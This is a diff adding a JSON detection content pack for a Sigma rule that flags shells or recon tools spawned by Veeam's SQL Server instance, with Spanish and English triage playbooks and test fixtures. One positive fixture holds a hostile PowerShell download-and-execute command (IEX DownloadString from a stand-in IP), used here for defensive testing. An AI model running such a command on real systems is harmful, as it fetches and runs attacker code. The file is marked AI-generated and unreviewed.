@@ -1,0 +1,124 @@
+{
+  "rule": {
+    "id": "d55b793d-f847-4eea-b59a-5ab09908ac90",
+    "title": "Suspicious Child Process Of Veeam Dabatase",
+    "level": "critical",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_mssql_veaam_susp_child_processes.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mssql_veaam_susp_child_processes.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "La instancia SQL Server de Veeam (sqlservr.exe con VEEAMSQL) inició un shell con argumentos sospechosos o una herramienta de reconocimiento. Esto puede indicar ejecución remota de código o SQL injection contra el servidor de respaldos.",
+      "what_it_detects": "Procesos hijos de sqlservr.exe cuya ParentCommandLine contiene VEEAMSQL. Pueden ser cmd.exe, powershell.exe, pwsh.exe, wsl.exe o wt.exe con indicadores en CommandLine (bypass, DownloadString, URLs, mshta, regsvr32, rundll32, wscript, cscript, copy), o bien net, net1, netstat, nltest, ping, tasklist o whoami.",
+      "why_it_matters": "Un motor de base de datos casi nunca lanza shells ni comandos de reconocimiento. Esto suele indicar abuso de xp_cmdshell o explotación de la aplicación pública (acceso inicial). Los servidores Veeam guardan credenciales y respaldos, así que comprometerlos facilita la persistencia, la escalada de privilegios y el sabotaje de la recuperación.",
+      "triage_steps": [
+        "Revise Image, CommandLine, ParentCommandLine y el usuario de ejecución, normalmente la cuenta de servicio de SQL. Decodifique cualquier comando de PowerShell codificado.",
+        "Busque URLs, IPs o archivos descargados en CommandLine. Valide su reputación y si hubo conexiones salientes desde el host.",
+        "Revise los procesos hijos y nietos del shell en el mismo host (±15 minutos), y también archivos creados, servicios o tareas programadas.",
+        "Consulte los logs de SQL Server para ver si se habilitó xp_cmdshell (sp_configure), si hubo inicios de sesión inusuales o si se ejecutaron consultas anómalas.",
+        "Identifique las IPs de origen que se conectaron al puerto de SQL o a los servicios de Veeam en esa ventana. Revise si el servidor Veeam tiene parches pendientes.",
+        "Busque alertas previas en este host, de la cuenta de servicio y de las IPs de origen."
+      ],
+      "false_positives": [
+        "Scripts de mantenimiento o diagnóstico de administradores que usan xp_cmdshell en la instancia VEEAMSQL, por ejemplo con ping o copy hacia un recurso compartido.",
+        "Herramientas de soporte de Veeam o del proveedor que ejecutan comandos de inventario como whoami o tasklist."
+      ],
+      "response_steps": [
+        "Confirme con el equipo de respaldos si la actividad estaba autorizada. Si no lo estaba, aísle el servidor Veeam de la red conservando el acceso para análisis forense.",
+        "Capture memoria, los artefactos de proceso y los logs de SQL antes de hacer cambios.",
+        "Deshabilite xp_cmdshell, rote las credenciales de SQL, de Veeam y las almacenadas en el servidor, y bloquee los indicadores de red identificados.",
+        "Elimine la persistencia encontrada, aplique los parches de Veeam y verifique la integridad de los respaldos antes de restaurar el servicio."
+      ],
+      "severity_rationale": "Es crítica porque, en un servidor de respaldos, un shell o un reconocimiento lanzado por el motor SQL casi siempre implica ejecución de código por parte de un atacante."
+    },
+    "en": {
+      "summary": "The Veeam SQL Server instance (sqlservr.exe with VEEAMSQL) launched a shell with suspicious arguments or a reconnaissance tool. This may indicate remote code execution or SQL injection against the backup server.",
+      "what_it_detects": "Child processes of sqlservr.exe whose ParentCommandLine contains VEEAMSQL. These can be cmd.exe, powershell.exe, pwsh.exe, wsl.exe or wt.exe with indicators in CommandLine (bypass, DownloadString, URLs, mshta, regsvr32, rundll32, wscript, cscript, copy), or net, net1, netstat, nltest, ping, tasklist or whoami.",
+      "why_it_matters": "A database engine rarely spawns shells or recon commands. This usually means xp_cmdshell abuse or exploitation of a public-facing application (initial access). Veeam servers hold credentials and backups, so compromising one helps an attacker persist, escalate privileges and sabotage recovery.",
+      "triage_steps": [
+        "Review Image, CommandLine, ParentCommandLine and the executing user, usually the SQL service account. Decode any encoded PowerShell.",
+        "Extract URLs, IPs or downloaded files from CommandLine. Check their reputation and whether the host made outbound connections.",
+        "Review child and grandchild processes of the shell on the same host (±15 minutes), plus any new files, services or scheduled tasks.",
+        "Check SQL Server logs for xp_cmdshell being enabled (sp_configure), unusual logins or anomalous queries.",
+        "Identify source IPs that connected to the SQL port or Veeam services in that window. Check the Veeam server's patch level.",
+        "Search for earlier alerts on this host, the service account and those source IPs."
+      ],
+      "false_positives": [
+        "Admin maintenance or diagnostic scripts that use xp_cmdshell on the VEEAMSQL instance, for example ping, or copy to a share.",
+        "Veeam or vendor support tooling that runs inventory commands such as whoami or tasklist."
+      ],
+      "response_steps": [
+        "Confirm with the backup team whether the activity was authorized. If it was not, isolate the Veeam server from the network but keep access for forensics.",
+        "Capture memory, process artifacts and SQL logs before making changes.",
+        "Disable xp_cmdshell, rotate SQL and Veeam credentials and any credentials stored on the server, and block the network indicators you identified.",
+        "Remove any persistence you find, patch Veeam and verify backup integrity before restoring service."
+      ],
+      "severity_rationale": "Critical, because a shell or recon launched by the SQL engine on a backup server almost always means an attacker is executing code."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "VEEAMSQL sqlservr.exe spawns cmd.exe that runs PowerShell with execution policy bypass and DownloadString",
+        "event": {
+          "EventID": 1,
+          "Computer": "VEEAM-BKP01.andes.local",
+          "User": "NT SERVICE\\MSSQL$VEEAMSQL2016",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe\" -sVEEAMSQL2016",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "\"cmd.exe\" /c powershell.exe -ex bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\""
+        }
+      },
+      {
+        "description": "VEEAMSQL sqlservr.exe spawns whoami.exe (reconnaissance)",
+        "event": {
+          "EventID": 1,
+          "Computer": "VEEAM-BKP01.andes.local",
+          "User": "NT SERVICE\\MSSQL$VEEAMSQL2016",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe\" -sVEEAMSQL2016",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "whoami /all"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "VEEAMSQL sqlservr.exe spawns cmd.exe for a benign directory listing with none of the suspicious keywords",
+        "event": {
+          "EventID": 1,
+          "Computer": "VEEAM-BKP01.andes.local",
+          "User": "NT SERVICE\\MSSQL$VEEAMSQL2016",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL13.VEEAMSQL2016\\MSSQL\\Binn\\sqlservr.exe\" -sVEEAMSQL2016",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c dir D:\\Backups"
+        }
+      },
+      {
+        "description": "whoami.exe spawned by a non-Veeam default SQL Server instance",
+        "event": {
+          "EventID": 1,
+          "Computer": "DB-0142.andes.local",
+          "User": "NT SERVICE\\MSSQLSERVER",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe\" -sMSSQLSERVER",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "whoami"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
